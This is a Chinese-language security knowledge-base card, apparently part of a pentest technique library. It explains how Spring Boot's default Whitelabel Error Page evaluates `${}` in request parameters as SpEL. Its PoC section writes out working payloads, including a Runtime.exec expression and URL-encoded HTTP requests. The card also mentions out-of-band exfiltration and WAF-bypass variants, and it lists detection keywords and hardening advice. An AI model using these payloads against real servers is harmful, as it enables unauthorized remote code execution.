---
id: web-java-framework-spring-whitelabel-error-page-spel-injection
title: Spring Boot Whitelabel Error Page 递归解析 ${} 并交给 SpEL：参数值进入默认错误页导致命令执行
type: scenario
domain: web
path: web/java/expression/spel
technique: spring-boot-whitelabel-error-page-spel-rce
aliases:
- Whitelabel Error Page SpEL 注入
- ErrorMvcAutoConfiguration resolvePlaceholder
- Spring Boot 默认错误页 ${} 注入
- PropertyPlaceholderHelper 递归解析
- spring boot 错误页 RCE
tags:
- java
- spring
- spring-boot
- spel
- expression-injection
- error-page
- rce
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V321
  verified_at: '2026-11-08T15:33:48+08:00'
  notes: 已对照原文与图03核对：默认 Whitelabel 错误页、${6*6} 与 calc 字节数组 PoC 均与原文一致；原理归因（ErrorMvcAutoConfiguration/PropertyPlaceholderHelper 递归解析交 SpEL）按原文记录，原文仅截图 500 页面、未截图表达式执行结果，执行面需实测；未设 affected_versions（原文未给区间）。
---

## 一句话结论

Spring Boot 默认的 Whitelabel Error Page 在渲染错误属性时会经 `PropertyPlaceholderHelper` 递归解析 `${...}` 占位符，而 `ErrorMvcAutoConfiguration` 注册的占位符解析器会把占位符内容当 SpEL 表达式求值；当请求参数（如 `id`、`sid`）因 500 错误进入错误页属性时，参数值里的 `${T(java.lang.Runtime)...}` 会被执行，形成 SpEL 注入 RCE。

## 原理

- Spring Boot 未配置自定义错误页时会使用 `WhitelabelErrorView`，其错误模型由 `ErrorMvcAutoConfiguration` 相关组件生成，模型里包含 `timestamp`、`status`、`error`、`message`、`path` 等属性。
- 错误页在输出这些属性前会走 `PropertyPlaceholderHelper` 的解析流程；该 helper 支持嵌套占位符，会反复递归解析 `${...}`。
- 关键缺陷在于 `ErrorMvcAutoConfiguration` 使用的 `resolvePlaceholder`（占位符解析器）不是简单地查 Environment，而是把 `${}` 里的字符串交给 SpEL 求值。普通的 `${some.property}` 因此能读配置，而 `${6*6}`、`${T(...)...}` 则直接变成表达式执行。
- 因此只要请求参数的值能进入错误页的某个属性（典型是让参数触发 500，错误 `message` 或参数回显中带上该值），攻击者就能把 SpEL 表达式塞到参数里。无需登录，也无需知道任何配置键。
- 文章给出的版本背景是 Spring Boot 默认错误页且参数值被递归处理；具体受影响版本原文未标注，实际测试应先确认 `${6*6}` 是否被求值再尝试命令执行。

## 触发条件

- 目标使用 Spring Boot 默认 Whitelabel Error Page（未自定义 `/error` 视图）。
- 某个请求参数（如 `id`、`sid`、`name`）会因类型转换/业务异常导致 500，并且该参数值会进入错误响应（错误 message、错误路径或参数回显）。
- 错误页属性解析链仍然使用带 SpEL 求值的占位符解析器（未修复/未替换）。
- 目标 JDK 允许 SpEL 中的 `T()`、`Runtime` 等类型访问（默认 `StandardEvaluationContext` 下可以）。

## 利用步骤

1. 指纹识别：请求不存在或会出错的路径，确认返回白名 `Whitelabel Error Page`（页面含 `This application has no explicit mapping for /error`）。
2. 用 fuzz 找到会触发 500 且值会进入错误页的参数：对 `id`、`sid`、`name` 等传入 `${6*6}`，观察响应中是否出现 `36` 而不是原样 `${6*6}`。
3. 确认表达式可执行后，用命令执行表达式替换算术表达式；注意 URL 编码，`+`、空格、引号在请求参数中都需处理。
4. 无回显时改用外部带外/写文件姿势（如把命令输出写进可访问目录），或改用 DNS/HTTP 外带确认。
5. 验证后立即停止扩大，记录参数名与触发路径，便于复测与修复验证。

## PoC

确认解析：

```http
GET /article?id=%24%7B6*6%7D HTTP/1.1
Host: target:8080
```

响应中出现 `36` 说明 `${}` 被 SpEL 求值。

命令执行（`calc` 的字符数组写法，避免引号与空格）：

```text
${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x63,0x61,0x6c,0x63}))}
```

完整请求：

```http
GET /article?id=%24%7BT(java.lang.Runtime).getRuntime().exec(new%20String(new%20byte%5B%5D%7B0x63,0x61,0x6c,0x63%7D))%7D HTTP/1.1
Host: target:8080
```

## 变体与关联

- 变体：不同参数名与不同业务路径；只要异常把参数值带进错误模型即可。
- 变体：被 WAF 拦截 `T(`、`Runtime`、`exec` 时，使用 SpEL 反射/`ScriptEngine` 变形，参考 SpEL 关键字绕过卡。
- 关联：[[web-java-expression-spel-injection-to-rce]]（SpEL 注入基础与 `StandardEvaluationContext`）、[[web-java-expression-spel-waf-bypass-scriptengine-reflection]]（禁用 `T()`/关键字过滤时的绕过）。
- 边界：自定义 `/error` 视图、替换了占位符解析器、错误页不解析参数值、或仅在特定 Spring Boot 版本存在的实现差异，都会使该链不成立；原文未给受影响版本区间，实战需先做 `${6*6}` 验证。

## 检测与防御

- 检测：请求参数中出现 `${`、`#{`、`T(`、`Runtime`、`getRuntime`、`exec`、`new byte[]`；错误响应中出现本应被求值的表达式结果；同一 IP 对多个参数名做 `${6*6}` 探测。
- 防御：自定义错误页，避免使用默认 Whitelabel Error Page 输出用户可控值；升级 Spring Boot 到修复该占位符解析行为的版本。
- 防御：错误响应最小化（只返回通用错误码与 traceId，不回显参数值与异常 message）；对参数做类型/白名单校验，避免把任意字符串写入错误属性。
- 加固：WAF 拦截包含 `${`、`T(`、`Runtime` 的参数；对 SpEL 求值仅使用 `SimpleEvaluationContext`，不要对用户输入使用 `StandardEvaluationContext`。
